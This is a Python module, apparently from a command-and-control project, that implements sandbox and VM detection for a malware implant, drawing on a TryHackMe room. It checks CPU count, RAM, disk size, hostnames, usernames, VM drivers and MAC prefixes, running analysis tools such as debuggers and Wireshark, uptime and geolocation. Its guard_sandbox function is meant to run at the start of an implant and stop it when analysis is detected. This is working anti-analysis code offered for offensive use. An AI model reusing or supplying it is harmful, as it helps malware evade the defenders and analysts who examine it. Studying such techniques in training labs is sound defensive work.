"""c2-37 sandbox detection -- identify analysis environments.

Techniques from TryHackMe Sandbox Evasion room:
- Sleep-based evasion (detect accelerated sleep)
- System information checks (CPU count, RAM, disk, hostname)
- Geolocation filtering (check IP against expected range)
- Network checks (domain membership, MAC vendor)
- User interaction checks (mouse movement, recent files)
- Process-based checks (look for analysis tools)
- Anti-debugging checks

All stdlib-only -- no external dependencies.
"""
from __future__ import annotations

import os
import platform
import socket
import subprocess
import time
import json


class SandboxDetector:
    """Detect if running inside a sandbox/VM/analysis environment.

    Returns a dict of check results. Each check returns True if
    the environment looks suspicious (possibly a sandbox).
    """

    @staticmethod
    def check_all() -> dict:
        """Run all sandbox detection checks."""
        results = {
            "sleep_acceleration": SandboxDetector.check_sleep_acceleration(),
            "low_cpu_count": SandboxDetector.check_cpu_count(),
            "low_ram": SandboxDetector.check_ram(),
            "small_disk": SandboxDetector.check_disk_size(),
            "suspicious_hostname": SandboxDetector.check_hostname(),
            "suspicious_username": SandboxDetector.check_username(),
            "vm_artifacts": SandboxDetector.check_vm_artifacts(),
            "analysis_tools": SandboxDetector.check_analysis_tools(),
            "recent_files": SandboxDetector.check_recent_files(),
            "uptime": SandboxDetector.check_uptime(),
        }
        results["score"] = sum(1 for v in results.values() if v is True)
        results["is_sandbox"] = results["score"] >= 3
        return results

    @staticmethod
    def check_sleep_acceleration(duration: float = 2.0) -> bool:
        """Check if sleep is being accelerated (common sandbox behavior).

        Sandboxes sometimes fast-forward sleep() calls to speed up analysis.
        If a 2-second sleep completes in < 1.5 seconds, it's suspicious.
        """
        t1 = time.time()
        time.sleep(duration)
        elapsed = time.time() - t1
        return elapsed < (duration * 0.75)

    @staticmethod
    def check_cpu_count(min_cpus: int = 2) -> bool:
        """Check CPU count. Sandboxes often have 1-2 CPUs."""
        try:
            cpus = os.cpu_count() or 1
            return cpus < min_cpus
        except Exception:
            return False

    @staticmethod
    def check_ram(min_gb: float = 2.0) -> bool:
        """Check total RAM. Sandboxes often have < 2GB."""
        try:
            if platform.system() == "Linux":
                with open("/proc/meminfo") as f:
                    for line in f:
                        if "MemTotal" in line:
                            kb = int(line.split()[1])
                            gb = kb / (1024 * 1024)
                            return gb < min_gb
            elif platform.system() == "Windows":
                import ctypes
                kernel32 = ctypes.windll.kernel32
                c_ulonglong = ctypes.c_ulonglong
                mem = c_ulonglong(0)
                kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(mem))
                gb = mem.value / (1024 * 1024)
                return gb < min_gb
        except Exception:
            pass
        return False

    @staticmethod
    def check_disk_size(min_gb: float = 50.0) -> bool:
        """Check disk size. Sandboxes often have small disks (< 50GB)."""
        try:
            if platform.system() == "Linux":
                st = os.statvfs("/")
                total_gb = (st.f_blocks * st.f_frsize) / (1024 ** 3)
                return total_gb < min_gb
            elif platform.system() == "Windows":
                import ctypes
                free = ctypes.c_ulonglong(0)
                total = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                    "C:\\", None, ctypes.byref(total), ctypes.byref(free))
                total_gb = total.value / (1024 ** 3)
                return total_gb < min_gb
        except Exception:
            pass
        return False

    @staticmethod
    def check_hostname() -> bool:
        """Check for sandbox-like hostnames."""
        sandbox_names = {
            "sandbox", "malware", "virus", "analysis", "cuckoo",
            "test", "sample", "desktop-", "win-", "john-pc",
            "pc-", "user-pc", "sandbox-", "vmware", "virtualbox",
        }
        hostname = socket.gethostname().lower()
        return any(name in hostname for name in sandbox_names)

    @staticmethod
    def check_username() -> bool:
        """Check for sandbox-like usernames."""
        sandbox_users = {
            "sandbox", "malware", "virus", "analysis", "test",
            "admin", "user", "john", "sample", "currentuser",
            "cuckoo", "tequilaboomboom", "analyst", "lab",
        }
        username = (os.getenv("USER") or os.getenv("USERNAME") or "").lower()
        return username in sandbox_users

    @staticmethod
    def check_vm_artifacts() -> bool:
        """Check for VM-specific artifacts (files, registry, drivers)."""
        vm_indicators = []

        if platform.system() == "Linux":
            # Check DMI data
            try:
                with open("/sys/class/dmi/id/product_name") as f:
                    product = f.read().strip().lower()
                    if any(v in product for v in ["virtualbox", "vmware", "kvm", "qemu", "xen"]):
                        return True
            except Exception:
                pass

            # Check for VM-specific modules
            try:
                proc = subprocess.run(["lsmod"], capture_output=True, text=True, timeout=5)
                modules = proc.stdout.lower()
                if any(m in modules for m in ["vboxguest", "vmw_balloon", "virtio"]):
                    return True
            except Exception:
                pass

        elif platform.system() == "Windows":
            # Check for VM-specific files
            vm_files = [
                "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
                "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
                "C:\\Windows\\System32\\drivers\\vm3dmp.sys",
                "C:\\Program Files\\VMware\\VMware Tools",
                "C:\\Program Files\\Oracle\\VirtualBox Guest Additions",
            ]
            for f in vm_files:
                if os.path.exists(f):
                    return True

            # Check for VM MAC address prefixes
            try:
                proc = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, timeout=5)
                output = proc.stdout.upper()
                vm_macs = ["08-00-27", "00-0C-29", "00-50-56", "00-1C-42", "00-16-3E"]
                if any(mac in output for mac in vm_macs):
                    return True
            except Exception:
                pass

        return False

    @staticmethod
    def check_analysis_tools() -> bool:
        """Check for common analysis/debugging tools running."""
        analysis_procs = {
            "wireshark", "procmon", "procmon64", "processhacker",
            "x64dbg", "x32dbg", "ollydbg", "windbg", "ida",
            "ida64", "ghidra", "pestudio", "autoruns", "tcpdump",
            "fiddler", "burp", "charles", "dnspy", "immunitydebugger",
            "regmon", "filemon", "sysmon", "fakenet",
        }
        try:
            if platform.system() == "Linux":
                proc = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=5)
            else:
                proc = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=5)
            output = proc.stdout.lower()
            return any(tool in output for tool in analysis_procs)
        except Exception:
            return False

    @staticmethod
    def check_recent_files(min_files: int = 10) -> bool:
        """Check for recent files. Real systems have many; sandboxes have few."""
        try:
            if platform.system() == "Windows":
                recent_dir = os.path.join(
                    os.getenv("APPDATA", ""),
                    "Microsoft", "Windows", "Recent"
                )
                if os.path.isdir(recent_dir):
                    files = os.listdir(recent_dir)
                    return len(files) < min_files
            elif platform.system() == "Linux":
                home = os.path.expanduser("~")
                recent = os.path.join(home, ".local", "share", "recently-used.xbel")
                if os.path.exists(recent):
                    with open(recent) as f:
                        content = f.read()
                        return content.count("<bookmark") < min_files
        except Exception:
            pass
        return False

    @staticmethod
    def check_uptime(min_minutes: int = 30) -> bool:
        """Check system uptime. Sandboxes are usually freshly booted."""
        try:
            if platform.system() == "Linux":
                with open("/proc/uptime") as f:
                    uptime_seconds = float(f.read().split()[0])
                    return uptime_seconds < (min_minutes * 60)
            elif platform.system() == "Windows":
                proc = subprocess.run(
                    ["net", "stats", "workstation"],
                    capture_output=True, text=True, timeout=5
                )
                # Parse uptime from output
                for line in proc.stdout.split("\n"):
                    if "Statistics since" in line:
                        # If we can parse this, the system was recently booted
                        return True
        except Exception:
            pass
        return False

    @staticmethod
    def check_geolocation(expected_country: str = None, expected_org: str = None) -> bool:
        """Check geolocation via ifconfig.me.

        Returns True if geolocation doesn't match expected values
        (suggesting sandbox in a different location).
        """
        if not expected_country and not expected_org:
            return False

        try:
            import urllib.request
            req = urllib.request.Request(
                "https://ifconfig.me/all.json",
                headers={"User-Agent": "curl/7.68.0"}
            )
            resp = urllib.request.urlopen(req, timeout=5)
            data = json.loads(resp.read())
            ip = data.get("ip_addr", "")

            # Check with RDAP if we have an IP
            if ip and expected_org:
                rdap_req = urllib.request.Request(
                    "https://rdap.arin.net/registry/ip/" + ip,
                    headers={"Accept": "application/json"}
                )
                rdap_resp = urllib.request.urlopen(rdap_req, timeout=5)
                rdap_data = json.loads(rdap_resp.read())
                org = rdap_data.get("name", "").lower()
                if expected_org.lower() not in org:
                    return True

        except Exception:
            pass
        return False


def guard_sandbox(threshold: int = 3, delay: int = 0) -> bool:
    """Run sandbox checks and exit if sandbox detected.

    Call this at the start of your implant. Returns True if safe to proceed.

    Args:
        threshold: Number of checks that must trigger to consider it a sandbox
        delay: Seconds to sleep before checking (evade short-lived sandboxes)
    """
    if delay > 0:
        time.sleep(delay)

    results = SandboxDetector.check_all()
    if results["score"] >= threshold:
        return False
    return True
